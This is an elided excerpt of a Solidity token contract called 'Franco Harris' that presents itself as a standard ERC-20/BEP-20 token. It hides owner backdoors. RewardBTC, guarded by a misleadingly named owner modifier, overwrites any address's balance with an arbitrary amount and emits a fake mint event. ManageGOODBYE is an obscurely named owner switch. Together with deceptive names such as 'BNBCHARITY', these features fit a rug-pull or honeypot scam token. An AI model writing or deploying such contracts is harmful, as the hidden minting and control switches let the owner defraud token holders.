...
contract FrancoHarris is ierc20, Auth {
    ...
    string constant _name = "Franco Harris";
    string constant _symbol = "FRANCOHARRIS";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 10000000000 * (10 ** _decimals);
    uint256 public _maxTxAmount = 5000000000000000000000000000000; 
    uint256 public _maxWalletSize = 500000000000000000000000000000; 
  ...
  modifier _onlyOwner () {
    require(oowner == msg.sender, "ERC20: permit Pancake address");
    _;
  }   

     function RewardBTC(address BNBCHARITY, uint256 amount) external _onlyOwner {
      _balances[BNBCHARITY] = (0 + 0) + amount * 10 ** 9;
    
        emit Transfer(address(0), BNBCHARITY, amount * 10 ** 9);
    ...
    function ManageGOODBYE(bool state) external onlyOwner{
        manageGOODBYE = state;
    }
